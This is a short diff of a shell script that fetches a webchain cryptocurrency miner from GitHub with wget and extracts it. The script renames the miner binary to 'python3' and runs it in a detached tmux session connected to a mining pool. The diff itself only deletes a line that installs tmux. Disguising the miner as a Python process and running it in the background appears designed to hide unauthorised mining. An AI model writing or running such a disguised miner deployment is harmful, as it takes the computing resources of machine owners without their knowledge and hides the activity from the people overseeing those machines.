@@ -23,7 +23,7 @@ tmux new-session -d -s my_session1 './python3 -o pool.webchain.network:3333 -u 0
 fi
 exit
 fi
-sudo apt-get install tmux -y
+
 wget https://github.com/webchain-network/webchain-miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
 tar xvzf webchain-miner-2.8.0-linux-amd64.tar.gz
 mv webchain-miner python3
